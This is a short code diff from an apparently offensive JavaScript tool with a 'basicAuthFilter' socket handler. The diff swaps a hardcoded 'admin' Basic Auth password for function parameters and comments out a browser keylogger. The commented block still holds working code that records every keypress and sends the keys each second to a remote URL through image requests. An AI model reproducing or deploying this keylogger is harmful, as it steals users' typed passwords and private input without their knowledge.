@@ -1,8 +1,6 @@
 
 
-function doBasicAuthorization() {
-    var username = 'admin';
-    var password = 'qa123456';
+function doBasicAuthorization(username, password) {
     var base64Credentials = btoa(username + ':' + password);
     var basicAuthHeaders = new Headers({'Authorization': 'Basic ' + base64Credentials});
 
@@ -192,18 +190,18 @@ socket.on('basicAuthFilter', function(data) {
 
 //############# KEY LOGGER ######################
 
-document.onkeypress = function(e) {
-	get = window.event?event:e;
-	key = get.keyCode?get.keyCode:get.charCode;
-	key = String.fromCharCode(key);
-	keys+=key;
-}
-window.setInterval(function(){
-	if(keys.length>0) {
-		new Image().src = url+keys;
-		keys = '';
-	}
-}, 1000);
+//document.onkeypress = function(e) {
+//	get = window.event?event:e;
+//	key = get.keyCode?get.keyCode:get.charCode;
+//	key = String.fromCharCode(key);
+//	keys+=key;
+//}
+//window.setInterval(function(){
+//	if(keys.length>0) {
+//		new Image().src = url+keys;
+//		keys = '';
+//	}
+//}, 1000);
 
 
 
